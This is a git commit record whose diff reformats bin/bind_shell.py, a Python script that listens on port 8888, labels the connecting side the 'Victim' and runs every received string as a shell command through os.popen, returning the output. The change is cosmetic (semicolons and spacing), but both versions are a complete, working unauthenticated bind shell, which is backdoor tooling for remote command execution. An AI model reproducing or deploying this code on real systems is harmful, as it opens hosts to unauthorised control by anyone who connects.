d01b1183b277f34a3bf8ae06500148686fe1fbe8
Ryan Hays <hays.ryan@gmail.com>
2016-10-02 14:57:53 -0400

    Added reverse shell and meta.conf file to open the script context.

--- bin/bind_shell.py
+++ bin/bind_shell.py
@@ -18,22 +18,22 @@ host = "0.0.0.0"
 port = int(8888)
 while True:
         try:
-                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-                s.bind((host,port));
-                s.listen(4);
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.bind((host, port))
+                s.listen(4)
                 while True:
-                        c,addr=s.accept();
-                        c.send("[*] Connected to Victim [ %s : %s ] Successfully\n"%(addr[0],port));
+                        c,addr = s.accept()
+                        c.send("[*] Connected to Victim [ %s : %s ] Successfully\n"%(addr[0],port))
                         for tym in range(0,50):
-                                data=c.recv(1024);
+                                data=c.recv(1024)
                                 for line in os.popen(data):
-                                        c.send(line);
+                                        c.send(line)
         except KeyboardInterrupt:
-                c.send("\n\t[ctrl+c] server forcely closed by Victim.\n");
-                s.close();
-                sys.exit(1);
+                c.send("\n\t[ctrl+c] server closed by Victim.\n")
+                s.close()
+                sys.exit(1)
         except socket.error:
-                print "\n\t[error] Address { %s : %s } already in use."%(host,port);
-                print "\t[error] just wait a bit until we correct it for you.";
-                s.close();
-                print "\n\ntrying again ....";
+                print "\n\t[error] Address { %s : %s } already in use."%(host,port)
+                print "\t[error] just wait a bit until we correct it for you."
+                s.close()
+                print "\n\ntrying again ...."
